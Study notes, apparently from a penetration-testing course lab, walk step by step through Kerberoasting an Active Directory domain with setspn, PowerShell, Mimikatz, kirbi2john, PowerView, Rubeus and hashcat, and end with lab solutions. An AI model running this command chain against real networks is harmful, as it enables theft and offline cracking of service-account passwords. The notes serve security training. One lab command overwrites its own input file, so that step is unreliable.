# Kerberoasting - Semi Manual method
---
- Before t**ools such as `Rubeus` existed**, **stealing or forging Kerberos tickets was a complex, manual process**.
- As the tactic and defenses have evolved, **we can now perform Kerberoasting from Windows in multiple ways.**
- Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.

## Enumerating SPNs with setspn.exe
- `setspn.exe -Q */*`
- We will notice many different SPNs returned for the various hosts in the domain.
	- We will **focus on `user accounts` and ignore the computer accounts** returned by the tool.

## Targeting a Single User
- Next, using **PowerShell, we can request TGS tickets for an account** in the shell above and **load them into memory**
	- `Add-Type -AssemblyName System.IdentityModel`
	- `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
	  
	- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to **add a .NET framework class to our PowerShell session,** which can then be instantiated like any .NET framework object
	- The **`-AssemblyName` parameter** allows us to **specify an assembly that contains types that we are interested in using**
	- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different **classes for building security token services**
	  
	- We'll then use the **[New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object**
	- **We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class** to **create a security token** **and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session**

## Extracting Tickets from Memory with Mimikatz:
- `base64 /out:true`
- `kerberos::list /export  `
- If **we do not specify the `base64** /out:true` command, **Mimikatz will extract the tickets and write them to `.kirbi` files**

## Preparing the Base64 Blob for Cracking
- Next, w**e can take the base64 blob and remove new lines and white spaces since the output is column wrapped,** and we need it all on one line for the next step:
	- `echo "<base64 blob>" |  tr -d \\n `
- We can place the **above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.**

## Placing the Output into a File as .kirbi
- `cat encoded_file | base64 -d > sqldev.kirbi`

## Extracting the Kerberos Ticket using kirbi2john.py
- `python2.7 kirbi2john.py sqldev.kirbi`
- This will create a file called `crack_file`. **We then must modify the file a bit to be able to use Hashcat against the hash.**

## Modifiying crack_file for Hashcat
- `$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`

## Cracking the Hash with Hashcat
- `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt `

- If we **decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk.** 
- In this case, **- we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.**

# Automated / Tool Based Route
---
## Using PowerView to Enumerate SPN Accounts
- `Import-Module .\PowerView.ps1`
- `Get-DomainUser * -spn | select samaccountname`
- ![[Pasted image 20250809072806.png]]

## Using PowerView to Target a Specific User
- `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
## Exporting All Tickets to a CSV File
- `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`
## Viewing the Contents of the .CSV File
- `cat .\ilfreight_tgs.csv`

# Using Rubeus
---
- `\Rubeus.exe`
- Some options include:
	- **Performing Kerberoasting** and outputting hashes to a file
	- Using alternate credentials
	- Performing **Kerberoasting combined with a pass-the-ticket attack**
	- Performing **"opsec" Kerberoasting to filter out AES-enabled accounts**
	- Requesting tickets for accounts passwords set between a specific date range
	- Placing a limit on the number of tickets requested
	- Performing **AES Kerberoasting**

## Using the /stats Flag:
- `.\Rubeus.exe kerberoast /stats`
- ![[Pasted image 20250809073347.png]]
- Let's use Rubeus to **request tickets for accounts with the `admincount` attribute set to `1`.**
- These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat.
- Be sure to **specify the `/nowrap` flag** so that the hash can be more **easily copied down for offline cracking using Hashcat.**
	- The **""/nowrap" flag prevents any base64 ticket blobs from being column wrapped** for any function

## Using the /nowrap Flag:
- `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`

- Kerberoasting tools **typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests**. 
- This is because **RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline** using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.
- When performing Kerberoasting in most environments, **we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket.**
- Let's start by **creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out.** As we can see, we received the TGS ticket RC4 (type 23) encrypted:
	- `.\Rubeus.exe kerberoast /user:testspn /nowrap`

- Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

- ` Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`

## Cracking the Ticket with Hashcat & rockyou.txt:
- `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`

# LABS
----
=> What is the name of the service account with the SPN 'vmware/inlanefreight.local'? 
- `setspn.exe -Q */*`
- ![[Pasted image 20250809075415.png]]

=> Crack the password for this account and submit it as your answer. 
- `Import-Module .\PowerView.ps1`
- `Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat`
	- ![[Pasted image 20250809075520.png]]
- Copy this hash to a file to remove white spaces and new lines:
	- `cat svc_vmwaresso.hash | tr -d "\\n" | tr -d " " > svc_vmwaresso.hash`
	- ![[Pasted image 20250809075601.png]]
- Crack the hash using hashcat:
	- `hashcat svc_vmwaresso.hash /usr/share/wordlists/rockyou.txt`
	- ![[Pasted image 20250809075635.png]]